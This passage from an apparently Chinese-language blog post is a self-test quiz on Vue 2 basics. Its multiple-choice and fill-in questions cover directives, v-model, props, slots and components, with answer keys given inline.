id="这样也不总是符合实际需求，所以-Vue-为你提供了一种方式来表达“这两个元素是完全独立的，不要复用它们”。只需添加一个具有唯一值的-属性即可"><a href="#这样也不总是符合实际需求，所以-Vue-为你提供了一种方式来表达“这两个元素是完全独立的，不要复用它们”。只需添加一个具有唯一值的-属性即可" class="headerlink" title="这样也不总是符合实际需求，所以 Vue 为你提供了一种方式来表达“这两个元素是完全独立的，不要复用它们”。只需添加一个具有唯一值的 ??_ 属性即可"></a>这样也不总是符合实际需求，所以 Vue 为你提供了一种方式来表达“这两个元素是完全独立的，不要复用它们”。只需添加一个具有唯一值的 <em><strong><strong>??</strong></strong></em>_ 属性即可</h5><h3 id="十五、"><a href="#十五、" class="headerlink" title="十五、"></a>十五、</h3><h5 id="关于-v-if-和-v-show-的描述，正确的有"><a href="#关于-v-if-和-v-show-的描述，正确的有" class="headerlink" title="关于 v-if 和 v-show 的描述，正确的有"></a>关于 v-if 和 v-show 的描述，正确的有</h5><p>A: 有 v-show 的元素会被渲染并保留在 DOM 中，v-show 只是简单地切换元素的 CSS 属性 display<br>B: v-show 不支持 <code>&lt;template&gt;</code> 元素，也不支持 v-else<br>C: v-if 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。<br>D: v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。相比之下，v-show 就简单得多——不管初始条件是什么，元素总是会被渲染<br>E: 一般来说，v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好。</p><blockquote><p><em><strong>11.C 12.{ deep: true } 13.没有单位 14.key 15.ABCDE</strong></em></p></blockquote><h3 id="十六、"><a href="#十六、" class="headerlink" title="十六、"></a>十六、</h3><h5 id="关于-v-for，正确的有"><a href="#关于-v-for，正确的有" class="headerlink" title="关于 v-for，正确的有"></a>关于 v-for，正确的有</h5><p>A: 可以使用 v-for 来迭代或遍历一个数组： <li v-for="(item, index) in items"><br>B: 可以使用 v-for 来迭代或遍历一个对象： <li v-for="(value, key, index) in object"><br>C: v-for 在遍历对象时，是按 Object.keys() 的结果遍历，但是不能保证它的结果在不同的 JavaScript 引擎下是一致的。</p><h3 id="十七、"><a href="#十七、" class="headerlink" title="十七、"></a>十七、</h3><p>代码：<a href="http://jsbin.com/gacokit/8/edit?html,js,output" title="null">http://jsbin.com/gacokit/8/edit?html,js,output</a></p><p>上面代码有一个 BUG，进行如下操作就会看到 BUG：</p><ol><li>点击3次 add 按钮</li><li>点击前两个「点我」按钮，会看到两个 true</li><li>删除其中一个 true</li><li>发现依然有两个 true</li></ol><p><img src="/Blog/2018/11/11/vue/%E6%9C%89%E6%B2%A1%E6%9C%89%E5%85%A5%E9%97%A8VUE%EF%BC%8C%E5%B0%B1%E7%9C%8B%E8%BF%99%E4%BB%BD%E8%87%AA%E6%B5%8B%E9%A2%98%E4%BA%86%E2%99%A8/index/img.gif"></p><h5 id="请问出现-BUG-的原因是？（说出解决这个-BUG-的关键点即可，答案是一个英文单词）"><a href="#请问出现-BUG-的原因是？（说出解决这个-BUG-的关键点即可，答案是一个英文单词）" class="headerlink" title="请问出现 BUG 的原因是？（说出解决这个 BUG 的关键点即可，答案是一个英文单词）"></a>请问出现 BUG 的原因是？（说出解决这个 BUG 的关键点即可，答案是一个英文单词）</h5><h3 id="十八、"><a href="#十八、" class="headerlink" title="十八、"></a>十八、</h3><p>代码 <a href="http://jsbin.com/sidazuy/2/edit?html,js,output" title="null">http://jsbin.com/sidazuy/2/edit?html,js,output</a></p><p>上面代码中有一个 BUG：点击 add 后 this.items 变化了，但是页面却没有变化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">add</span>(<span class="params"></span>)&#123; </span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">items</span>[<span class="variable language_">this</span>.<span class="property">items</span>.<span class="property">length</span>] = &#123;<span class="attr">name</span>:<span class="string">&#x27;xxx&#x27;</span>,<span class="attr">clicked</span>:<span class="literal">false</span>,<span class="attr">id</span>:<span class="title class_">Math</span>.<span class="title function_">random</span>()&#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">items</span>) <span class="comment">//this.items 确实变化了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="请问这是为什么？"><a href="#请问这是为什么？" class="headerlink" title="请问这是为什么？"></a>请问这是为什么？</h5><p>A: 由于 JavaScript 的限制，Vue 不能检测到 this.items[this.items.length] 的变化，所以页面没有重新渲染。<br>B: 如果改成 this.items.push 就可以解决这个 BUG 了，因为 Vue 在 this.items.push 方法上做了一些手脚<br>C: 使用 this.$set(this.items, this.items.length, …) 能解决这个 BUG</p><h3 id="十九、"><a href="#十九、" class="headerlink" title="十九、"></a>十九、</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-for</span>=<span class="string">&quot;n in 10&quot;</span>&gt;</span></span><span class="template-variable">&#123;&#123; <span class="name">n</span> &#125;&#125;</span><span class="language-xml"> <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="这段代码的结果是？"><a href="#这段代码的结果是？" class="headerlink" title="这段代码的结果是？"></a>这段代码的结果是？</h5><p>A: 页面中显示 0 1 2 3 4 5 6 7 8 9 10<br>B: 页面中显示 1 2 3 4 5 6 7 8 9 10<br>C: 页面中显示 1 0</p><h3 id="二十、"><a href="#二十、" class="headerlink" title="二十、"></a>二十、</h3><p>代码： <a href="http://jsbin.com/hiyuqak/2/edit?html,js,output" title="null">http://jsbin.com/hiyuqak/2/edit?html,js,output</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">child</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) in items&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">add</span>&gt;</span>add<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/Blog/2018/11/11/vue/%E6%9C%89%E6%B2%A1%E6%9C%89%E5%85%A5%E9%97%A8VUE%EF%BC%8C%E5%B0%B1%E7%9C%8B%E8%BF%99%E4%BB%BD%E8%87%AA%E6%B5%8B%E9%A2%98%E4%BA%86%E2%99%A8/index/img.png"></p><h5 id="点击-add-后发现-child-组件全都位于-table-外面，请问是什么原因？"><a href="#点击-add-后发现-child-组件全都位于-table-外面，请问是什么原因？" class="headerlink" title="点击 add 后发现 child 组件全都位于 table 外面，请问是什么原因？"></a>点击 add 后发现 child 组件全都位于 table 外面，请问是什么原因？</h5><p>A: html 中 table 的子元素不能是 child，因此 child 被解析到 table 的外面了<br>B: 可以使用 &lt;tr is&#x3D;”child” 类似的语法来解决这个问题</p><blockquote><p><em><strong>16.ABC 17.key 18.ABC 19.B 20.AB</strong></em><br>###二十一、<br>#####Vue 事件处理相关知识中，$event 是什么？<br>A: $event 是指对应的事件信息<br>B: 对于原生元素（如 button、input）来说，$event 是原始的 DOM 事件<br>C: 对于自定义组件（如 child）来说，$event 是其自身 $emit 发出的第一个参数<br>D: 对于自定义组件（如 child）来说，$event 是其自身 $emit 发出的所有参数</p></blockquote><h3 id="二十二、"><a href="#二十二、" class="headerlink" title="二十二、"></a>二十二、</h3><h5 id="Vue-提供的修饰符有"><a href="#Vue-提供的修饰符有" class="headerlink" title="Vue 提供的修饰符有"></a>Vue 提供的修饰符有</h5><p>A: 事件修饰符：.stop .prevent .capture .self .once .passive<br>B: 键盘修饰符：.数字 .enter .tab .delete .esc .space .up .down .left .right .page-down .ctrl .alt .shift .meta .exact 等<br>C: 鼠标按钮修饰符：.left .right .middle</p><h3 id="二十三、"><a href="#二十三、" class="headerlink" title="二十三、"></a>二十三、</h3><h5 id="Vue-支持自定义的修饰符吗？https-github-com-vuejs-vue-issues-6982"><a href="#Vue-支持自定义的修饰符吗？https-github-com-vuejs-vue-issues-6982" class="headerlink" title="Vue 支持自定义的修饰符吗？https://github.com/vuejs/vue/issues/6982"></a>Vue 支持自定义的修饰符吗？<a href="https://github.com/vuejs/vue/issues/6982" title="null">https://github.com/vuejs/vue/issues/6982</a></h5><p>A: 支持<br>B: 不支持</p><h3 id="二十四、"><a href="#二十四、" class="headerlink" title="二十四、"></a>二十四、</h3><h5 id="Vue-文档中提到的「关注点分离原则」是什么？-Google一下"><a href="#Vue-文档中提到的「关注点分离原则」是什么？-Google一下" class="headerlink" title="Vue 文档中提到的「关注点分离原则」是什么？ Google一下"></a>Vue 文档中提到的「关注点分离原则」是什么？ <a href="https://www.google.com.hk/search?q=%E5%85%B3%E6%B3%A8%E7%82%B9%E5%88%86%E7%A6%BB" title="null">Google一下</a></h5><p>A: 是处理复杂性的一个原则。由于关注点混杂在一起会导致复杂性大大增加，所以把不同的关注点分离开来分别处理<br>B: 关注点分离在计算机科学中，是将计算机程序分隔为不同部分的设计原则。每一部分会有各自的关注焦点。比如网站可以分离为前端和后端，前端的网页又可以分离为 HTML、CSS 和 JS 等。</p><h3 id="二十五、"><a href="#二十五、" class="headerlink" title="二十五、"></a>二十五、</h3><p>html</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;value1&quot;</span> :value=<span class="string">&quot;value2&quot;</span>&gt;</span><br><span class="line">  &lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> app = <span class="literal">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="built_in">data</span>: &#123;</span><br><span class="line">    value1:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    value2:<span class="string">&#x27;2&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="请问最终-input-的-value-是多少？"><a href="#请问最终-input-的-value-是多少？" class="headerlink" title="请问最终 input 的 value 是多少？"></a>请问最终 input 的 value 是多少？</h5><p>A: 1<br>B: 2</p><blockquote><p><em><strong>21.ABC 22.ABC 23.B 24.AB 25.A</strong></em><br>###二十六、</p></blockquote><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">&quot;selected&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">v-bind:value</span>=<span class="string">&quot;</span></span></span><span class="template-variable">&#123; number: 123 &#125;</span><span class="language-xml"><span class="tag"><span class="string">&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="如果用户选择了该-option，请问-vm-selected-的值为"><a href="#如果用户选择了该-option，请问-vm-selected-的值为" class="headerlink" title="如果用户选择了该 option，请问 vm.selected 的值为"></a>如果用户选择了该 option，请问 vm.selected 的值为</h5><p>A: 使用错误，option 的 :value 不能是对象<br>B: vm.selected 为 123<br>C: vm.selected 为 “number”<br>D: vm.selected 为 {“number”:123} 对象</p><h3 id="二十七、"><a href="#二十七、" class="headerlink" title="二十七、"></a>二十七、</h3><p>在默认情况下，v-model 在每次 input 事件触发后将输入框的值与数据进行同步 (除了上述输入法组合文字时)。你可以添加<code>.__?__</code>修饰符，从而转变为使用 change 事件进行同步：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在“change”时而非“input”时更新 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model.__</span>?<span class="attr">__</span>=<span class="string">&quot;msg&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure><h3 id="二十八、"><a href="#二十八、" class="headerlink" title="二十八、"></a>二十八、</h3><p>v-model 其实只是一个语法糖，因为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">v-model</span>=<span class="string">&quot;searchText&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">input</span></span><br><span class="line">  v-bind:__A__=<span class="string">&quot;searchText&quot;</span></span><br><span class="line">  v-<span class="keyword">on</span>:__B____=<span class="string">&quot;searchText = _____C______&quot;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h5 id="请问-A-B-C-三个空应该分别填入什么？"><a href="#请问-A-B-C-三个空应该分别填入什么？" class="headerlink" title="请问 A B C 三个空应该分别填入什么？"></a>请问 A B C 三个空应该分别填入什么？</h5><h3 id="二十九、"><a href="#二十九、" class="headerlink" title="二十九、"></a>二十九、</h3><p>v-model 用到自定义组件上时，跟 input 稍有不同</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">custom-input</span> <span class="attr">v-model</span>=<span class="string">&quot;searchText&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">custom-input</span>&gt;</span></span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;custom-<span class="keyword">input</span></span><br><span class="line">  v-bind:value=<span class="string">&quot;searchText&quot;</span></span><br><span class="line">  v-<span class="keyword">on</span>:<span class="keyword">input</span>=<span class="string">&quot;searchText = ____?_____&quot;</span></span><br><span class="line">&gt;&lt;/custom-<span class="keyword">input</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="请问空格处应该填入什么"><a href="#请问空格处应该填入什么" class="headerlink" title="请问空格处应该填入什么"></a>请问空格处应该填入什么</h5><h3 id="三十、"><a href="#三十、" class="headerlink" title="三十、"></a>三十、</h3><h5 id="Vue-component-‘button-counter’-options-可以全局注册一个组件，关于这个-options-说法正确的是"><a href="#Vue-component-‘button-counter’-options-可以全局注册一个组件，关于这个-options-说法正确的是" class="headerlink" title="Vue.component(‘button-counter’, options) 可以全局注册一个组件，关于这个 options 说法正确的是"></a>Vue.component(‘button-counter’, options) 可以全局注册一个组件，关于这个 options 说法正确的是</h5><p>A: 因为组件是可复用的 Vue 实例，所以它们与 new Vue 接收<strong>几乎</strong>相同的选项，例如 data、computed、watch、methods 以及生命周期钩子等。<br>B: 这里的 options 不接受 el<br>C: 这里的 options.data 选项必须是一个函数</p><blockquote><p><em><strong>26.D 27.lazy 28.value&#x2F;input&#x2F;<code>$event.target.value 29.</code>$event&#96; 30.ABC</strong></em></p></blockquote><h3 id="三十一、"><a href="#三十一、" class="headerlink" title="三十一、"></a>三十一、</h3><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">component</span> v-bind:<span class="keyword">is</span>=<span class="string">&quot;currentTabComponent&quot;</span>&gt;&lt;/<span class="keyword">component</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="通过修改-currentTabComponent-的值，我们就可以让-component-在不同组件之间进行动态切换"><a href="#通过修改-currentTabComponent-的值，我们就可以让-component-在不同组件之间进行动态切换" class="headerlink" title="通过修改 currentTabComponent 的值，我们就可以让 component 在不同组件之间进行动态切换"></a>通过修改 currentTabComponent 的值，我们就可以让 component 在不同组件之间进行动态切换</h5><p>A: 对<br>B: 错</p><h3 id="三十二、"><a href="#三十二、" class="headerlink" title="三十二、"></a>三十二、</h3><ul><li><a href="https://cn.vuejs.org/v2/style-guide/#%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6%E5%90%8D-%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90" title="null">命名推荐</a><h5 id="遵循了-W3C-规范中的自定义组件名规则的组件名有"><a href="#遵循了-W3C-规范中的自定义组件名规则的组件名有" class="headerlink" title="遵循了 W3C 规范中的自定义组件名规则的组件名有"></a>遵循了 W3C 规范中的自定义组件名规则的组件名有</h5>A: xdialog<br>B: x-dialog<br>C: xDialog<br>D: XDialog</li></ul><h2 id="三十三、"><a href="#三十三、" class="headerlink" title="#三十三、"></a>#三十三、</h2><h5 id="关于「全局注册」和「局部注册」的描述，正确的有："><a href="#关于「全局注册」和「局部注册」的描述，正确的有：" class="headerlink" title="关于「全局注册」和「局部注册」的描述，正确的有："></a>关于「全局注册」和「局部注册」的描述，正确的有：</h5><p>A: 一个组件，在全局注册之后，可以用在任何新创建的 Vue 根实例的模板中。<br>B: 使用 webpack 等构建工具时，全局注册所有的组件意味着即便你已经不再使用一个组件了，它仍然会被包含在你最终的构建结果中。这造成了用户下载的 JavaScript 的无谓的增加。这个时候可以考虑使用局部注册。</p><h3 id="三十四、"><a href="#三十四、" class="headerlink" title="三十四、"></a>三十四、</h3><p>props 支持哪些写法？<br>假设有如下代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Vue.components(<span class="string">&#x27;x-component&#x27;</span>, &#123;</span><br><span class="line">    ... <span class="regexp">//</span>省略其他选项</span><br><span class="line">    props: ____?_____</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="请问以下哪些代码可以放在-处"><a href="#请问以下哪些代码可以放在-处" class="headerlink" title="请问以下哪些代码可以放在 ____?_____ 处"></a>请问以下哪些代码可以放在 <code>____?_____</code> 处</h5><p>A: [‘title’, ‘likes’, ‘isPublished’, ‘commentIds’, ‘author’]<br>B: {propA: Number}<br>C: {propB: [String, Number] }<br>D: {propC: { type: String, required: true } }<br>E: {propD: { type: Number, default: 100 }}<br>F: {propE: { type: Object, default: function () { return { message: ‘hello’ } } } }</p><h3 id="三十五、"><a href="#三十五、" class="headerlink" title="三十五、"></a>三十五、</h3><p>BlogPost 组件的注册</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Vue.<span class="title function_ invoke__">component</span>(<span class="string">&#x27;blog-post&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">props</span>: &#123;</span><br><span class="line">        <span class="attr">isPublished</span>: Boolean</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>html</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;blog-post is-published&gt;</span><span class="section">&lt;/blog-post&gt;</span></span><br></pre></td></tr></table></figure><h5 id="请问-blog-post-组件得到的-prop-isPublished-的值是多少？"><a href="#请问-blog-post-组件得到的-prop-isPublished-的值是多少？" class="headerlink" title="请问 blog-post 组件得到的 prop.isPublished 的值是多少？"></a>请问 blog-post 组件得到的 prop.isPublished 的值是多少？</h5><p>A: undefined<br>B: true</p><blockquote><p><em><strong>31.A 32.B 33.AB 34.ABCDEF 35.B</strong></em></p></blockquote><h3 id="三十六、"><a href="#三十六、" class="headerlink" title="三十六、"></a>三十六、</h3><p>假设 post 只有 id 和 title 两个属性，<br>那么</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog-post</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-bind:id</span>=<span class="string">&quot;post.id&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-bind:title</span>=<span class="string">&quot;post.title&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以缩写成</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog-post</span> <span class="attr">v-bind</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span><br></pre></td></tr></table></figure><p>A: 是的<br>B: 不行</p><h3 id="三十七、"><a href="#三十七、" class="headerlink" title="三十七、"></a>三十七、</h3><h5 id="关于单向数据流，对的有"><a href="#关于单向数据流，对的有" class="headerlink" title="关于单向数据流，对的有"></a>关于单向数据流，对的有</h5><p>A: 不应该在一个子组件内部改变（父组件传给它的）prop。如果这样做了，Vue 会在浏览器的控制台中发出警告。<br>B: 有些情况下，我们实在想要改变 prop，可以考虑定义一个本地的 data 属性，并将这个 prop 用作其初始值<br>C: 有些情况下，我们需要转换 prop 的值。那么可以使用计算属性<br>D: 假设某个 prop 是一个对象，如 props.user &#x3D; {name:’frank’}，如果子组件改变了 user.name，那么 Vue 会检测不到这种违反约定的代码，导致父组件的状态受到影响。</p><h3 id="三十八、"><a href="#三十八、" class="headerlink" title="三十八、"></a>三十八、</h3><p>假设 bootstrap-date-input 的模板是这样的：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=&quot;date&quot; <span class="keyword">class</span>=&quot;form-control&quot;&gt;</span><br></pre></td></tr></table></figure><p>假设我是这样使用这个组件的：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;bootstrap-<span class="type">date</span>-<span class="keyword">input</span> <span class="keyword">type</span>=&quot;input&quot; <span class="keyword">class</span>=&quot;hi&quot;&gt;&lt;/bootstrap-<span class="type">date</span>-<span class="keyword">input</span>&gt;</span><br></pre></td></tr></table></figure><p>请问最终得到的 HTML 是什么？<br>A: <input type="input" class="form-control hi"><br>B: <input type="input" class="hi"><br>C: <input type="date" class="form-control hi"><br>D: <input type="date" class="hi"></p><h3 id="三十九、"><a href="#三十九、" class="headerlink" title="三十九、"></a>三十九、</h3><p>接上题，上题中的 type 和 class 会替换或合并到 bootstrap-date-input 组件的根元素上。<br>#####如果我希望「禁用特性继承」，请问应该使用什么选项？</p><h3 id="四十、"><a href="#四十、" class="headerlink" title="四十、"></a>四十、</h3><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;text-<span class="built_in">document</span> v-bind:title.<span class="keyword">sync</span>=<span class="string">&quot;doc.title&quot;</span>&gt;&lt;/text-<span class="built_in">document</span>&gt;</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  v-bind:___A___=&quot;doc.title&quot;</span><br><span class="line">  v-on:___B___=&quot;doc.title = ___C___&quot;</span><br><span class="line">&gt;&lt;/text-document&gt;</span><br></pre></td></tr></table></figure><h5 id="A、B、C-三处分别填写什么？"><a href="#A、B、C-三处分别填写什么？" class="headerlink" title="A、B、C 三处分别填写什么？"></a>A、B、C 三处分别填写什么？</h5><blockquote><p>***36.A 37.ABCD 38.A 39.<a href="https://cn.vuejs.org/v2/guide/components-props.html#%E7%A6%81%E7%94%A8%E7%89%B9%E6%80%A7%E7%BB%A7%E6%89%BF">inheritAttrs: false</a> 40.title&#x2F;update:title&#x2F;$event</p></blockquote><h3 id="四十一、"><a href="#四十一、" class="headerlink" title="四十一、"></a>四十一、</h3><p>关于插槽的描述，正确的有</p><p>A. 假设有一个组件 <code>&lt;navigation-link&gt;</code>，如果 <code>&lt;navigation-link&gt;</code> 的 template 里没有包含一个 <code>&lt;slot&gt;</code> 元素，则任何传入 <code>&lt;navigation-link&gt;</code> 的内容都会被抛弃。<br>例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">navigation-link</span>&gt;</span></span><br><span class="line">  你好</span><br><span class="line"><span class="tag">&lt;/<span class="name">navigation-link</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中的你好将会被 Vue 删除。<br>B. 使用具名插槽 <code>&lt;slot name=&quot;xxx&#39;&gt;</code> 可以实现一个组件拥有多个插槽<br>C. 可以使用 <code>&lt;slot&gt;默认内容&lt;/slot&gt;</code> 来指定插槽里的默认内容<br>D. 可以用 this.$slots 来读取传入的<strong>所有</strong>插槽内容（建议用 <a href="http://jsbin.com/wayuri/3/edit?html,js,output" title="null">jsbin</a> 验证一下）<br>E. 通过设置 slot 属性可以设置内容对应的插槽名字<br>F. 通过设置 slot-scope 属性，可以从子组件中获取数据</p><h3 id="四十二、"><a href="#四十二、" class="headerlink" title="四十二、"></a>四十二、</h3><p>我们之前曾经在一个多标签的界面中使用 is 特性来切换不同的组件：</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">component</span> v-bind:<span class="keyword">is</span>=<span class="string">&quot;currentTabComponent&quot;</span>&gt;&lt;/<span class="keyword">component</span>&gt;</span><br></pre></td></tr></table></figure><p>当在这些组件之间切换的时候，你有时会想保持这些组件的状态，以避免反复重渲染导致的性能问题。</p><p>为了解决这个问题，我们可以用一个 <code>&lt;_____?_____&gt;</code> 元素将其动态组件包裹起来。</p><h3 id="四十三、"><a href="#四十三、" class="headerlink" title="四十三、"></a>四十三、</h3><p>关于异步组件，正确的有：<br>A. 异步组件是指，在需要用到它的时候才从服务器加载一个组件<br>B. 如果项目支持 webpack 2+ 和 ES 2015+，那么可以这样实现异步组件</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(</span><br><span class="line">    <span class="string">&#x27;async-webpack-example&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;./my-async-component&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>C. 如果项目支持 webpack 2+ 和 ES 2015+，那么可以这样实现异步组件</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="regexp">//</span> ...</span><br><span class="line">    components: &#123;</span><br><span class="line">        <span class="string">&#x27;my-component&#x27;</span>: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;./my-async-component&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>D. 根据 Vue 的文档来说，异步组件就是动态组件</p><h3 id="四十四、"><a href="#四十四、" class="headerlink" title="四十四、"></a>四十四、</h3><p>这里有一个关于依赖注入的例子：<a href="http://jsbin.com/zuvuhot/3/edit?html,js,output" title="null">http://jsbin.com/zuvuhot/3/edit?html,js,output</a><br>看完例子后请判断对错<br>html</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 